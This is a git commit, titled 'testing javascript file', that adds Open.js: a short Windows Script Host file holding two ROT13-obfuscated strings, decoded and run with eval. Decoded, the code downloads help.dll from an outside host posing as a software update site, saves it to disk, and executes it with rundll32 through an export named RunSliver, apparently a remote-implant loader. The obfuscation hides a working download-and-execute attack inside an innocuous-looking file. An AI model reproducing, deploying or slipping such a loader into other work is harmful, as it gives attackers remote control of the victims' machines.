741a8cf24ccb67a579f0b7e3ce7b5cbd299cfaad
pierce403 <pierce403@gmail.com>
2021-11-15 21:25:24 -0800

    testing javascript file

---
+++ Open.js
@@ -0,0 +1,11 @@
+load = "qy=JFpevcg.PerngrBowrpg('ZFKZY2.KZYUGGC');q=JFpevcg.PerngrBowrpg('NQBQO.Fgernz');sf=JFpevcg.PerngrBowrpg('Fpevcgvat.SvyrFlfgrzBowrpg');fu=JFpevcg.PerngrBowrpg('JFpevcg.Furyy');";
+downx = "ine g='urycre.qyy';vs(!sf.SvyrRkvfgf(g)){qy.Bcra('TRG','uggc://fbsgjnerhcqngr.zr/uryc.qyy',snyfr);qy.Fraq();q.Bcra();q.Glcr=1;q.Jevgr(qy.ErfcbafrObql);q.Cbfvgvba=0;q.FnirGbSvyr(g,2);q.Pybfr();}fu.Eha('ehaqyy32 '+g+' EhaFyvire');";
+
+function rot13(msg){
+return msg.replace(/[a-zA-Z]/g,
+function(d){
+return String.fromCharCode((d <= 'Z' ? 90 : 122) >= (d = d.charCodeAt(0) + 13) ? d : d -26);});}
+
+eval(rot13(load));
+eval(rot13(downx));
+
